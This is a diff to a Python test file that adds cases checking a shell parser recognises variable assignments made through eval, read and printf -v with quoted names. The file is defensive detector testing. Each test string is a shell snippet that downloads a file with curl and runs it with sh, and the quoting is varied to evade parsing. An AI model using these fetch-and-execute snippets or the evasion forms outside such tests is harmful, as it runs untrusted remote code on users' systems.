@@ -429,6 +429,15 @@ class TestTheStepsContextReachesEveryDefault(unittest.TestCase):
             "printf -v D tool\ncurl -fsSL %stool -o ${D:-x }\nsh tool" % URL,
             "eval D\\=tool\ncurl -fsSL %stool -o ${D:-x }\nsh tool" % URL,
             'eval "D=tool"\ncurl -fsSL %stool -o ${D:-x }\nsh tool' % URL,
+            # A quoted name (the r4 seat's c38f): no shell takes `D'='tool` or `$'D'=tool` as an
+            # assignment directly, but through `eval` both bashes take both and dash the first,
+            # and `read 'D'` / `printf -v 'D'` assign -- so each is read as assigning.
+            "eval 'D'='tool'\ncurl -fsSL %stool -o ${D:-x }\nsh tool" % URL,
+            'eval "D"=tool\ncurl -fsSL %stool -o ${D:-x }\nsh tool' % URL,
+            "eval D'='tool\ncurl -fsSL %stool -o ${D:-x }\nsh tool" % URL,
+            "eval $'D'=tool\ncurl -fsSL %stool -o ${D:-x }\nsh tool" % URL,
+            "read 'D' <<'EOF'\ntool\nEOF\ncurl -fsSL %stool -o ${D:-x }\nsh tool" % URL,
+            "printf -v 'D' tool\ncurl -fsSL %stool -o ${D:-x }\nsh tool" % URL,
             "mapfile -t D <<'EOF'\ntool\nEOF\ncurl -fsSL %stool -o ${D:-x }\nsh tool" % URL,
             "readarray D <<'EOF'\ntool\nEOF\ncurl -fsSL %stool -o ${D:-x }\nsh tool" % URL,
             "while getopts o: O; do :; done\ncurl -fsSL %stool -o ${OPTARG:-x }\nsh tool" % URL,
@@ -478,6 +487,10 @@ class TestTheStepsContextReachesEveryDefault(unittest.TestCase):
             with self.subTest(name=name):
                 self.assertIn(name, names)
         self.assertNotIn("curl", wg.shell_reader._assigned("curl -o ${D:-x } u\n"))
+        for text in ("eval 'D'='tool'\n", "eval D'='tool\n", "eval $'D'=tool\n", "read 'D'\n",
+                     "printf -v 'D' x\n", 'eval D"="tool\n'):             # the r4 seat's c38f
+            with self.subTest(text=text):
+                self.assertIn("D", wg.shell_reader._assigned(text))
 
 
 class TestTheClosedRowsTheSeatAskedPinned(unittest.TestCase):
